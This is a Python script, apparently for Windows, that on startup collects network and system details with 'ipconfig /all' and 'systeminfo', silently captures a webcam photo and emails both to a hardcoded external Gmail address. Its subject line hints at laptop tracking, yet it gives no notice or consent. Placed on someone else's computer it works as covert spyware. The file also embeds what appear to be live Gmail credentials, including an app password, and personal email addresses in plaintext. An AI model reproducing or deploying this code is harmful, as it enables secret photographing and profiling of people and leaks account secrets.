import subprocess
import time
import cv2
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
USERNAME = 'jco2024ppsc4@gmail.com'
PASSWORD = 'gkph viyh vcqs lube'  # Make sure this is the correct App Password


def get_ipconfig_output():
    result = subprocess.run(['ipconfig', '/all'],
                            capture_output=True, text=True)
    return result.stdout


def get_systeminfo_output():
    result = subprocess.run(['systeminfo'], capture_output=True, text=True)
    return result.stdout


def capture_image(filename='captured_image.jpg'):
    cap = cv2.VideoCapture(0)  # 0 is the default camera

    if not cap.isOpened():
        print("Error: Could not open video device.")
        return False

    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

    ret, frame = cap.read()

    if not ret:
        print("Error: Could not read frame.")
        cap.release()
        return False

    cv2.imwrite(filename, frame)
    cap.release()
    # print(f"Image captured and saved as {filename}")
    return True


def send_email(subject, body, to_email, attachment=None):
    msg = MIMEMultipart()
    msg['From'] = USERNAME
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    if attachment:
        with open(attachment, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',
                            f'attachment; filename={attachment}')
            msg.attach(part)

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(USERNAME, PASSWORD)
        text = msg.as_string()
        server.sendmail(USERNAME, to_email, text)
        server.quit()
        print(f"Email sent to {to_email}")
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False


def is_connected():
    try:
        # Connect to one of the root DNS servers
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        pass
    return False


def job():
    ipconfig_output = get_ipconfig_output()
    systeminfo_output = get_systeminfo_output()
    full_output = f"IP Configuration:\n\n{
        ipconfig_output}\n\nSystem Information:\n\n{systeminfo_output}"

    image_filename = 'captured_image.jpg'
    image_captured = capture_image(image_filename)

    subject = "Laptop IP and System Configuration on Startup"
    to_email = "marshadcs20@gmail.com"

    retries = 5
    success = False

    while retries > 0 and not success:
        if image_captured:
            success = send_email(subject, full_output,
                                 to_email, attachment=image_filename)
        else:
            success = send_email(subject, full_output, to_email)

        if not success:
            print("Retrying to send the email...")
            time.sleep(10)  # Wait 10 seconds before retrying
            retries -= 1

    if not success:
        print("Failed to send the email after multiple attempts.")
    else:
        print("Email sent successfully.")


def main():
    print("Checking for internet connection...")
    while not is_connected():
        time.sleep(5)  # Wait 5 seconds before retrying

    print("System is online, Getting information...")
    job()


if __name__ == "__main__":
    main()
